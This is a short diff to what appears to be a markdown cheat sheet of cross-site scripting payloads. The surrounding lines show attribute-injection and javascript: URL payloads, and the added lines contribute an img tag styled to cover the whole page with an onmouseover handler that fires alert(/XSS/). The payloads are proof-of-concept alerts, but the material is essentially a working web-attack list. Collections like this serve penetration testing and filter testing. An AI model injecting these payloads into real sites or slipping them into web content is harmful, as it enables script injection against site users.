@@ -91,6 +91,10 @@ ${alert(1337)}
 ```javascript
 /?'accesskey='x'onclick='alert(1337)
 ```
+```javascript
+<img ismap=itemtype=yyy style=width:100%;height:100%;position:fixed;left:0px;top\
+:0px; onmouseover=alert(/XSS/)//>
+```
 Inject in href attribute:
 ```javascript
 javascript:alert(1337)
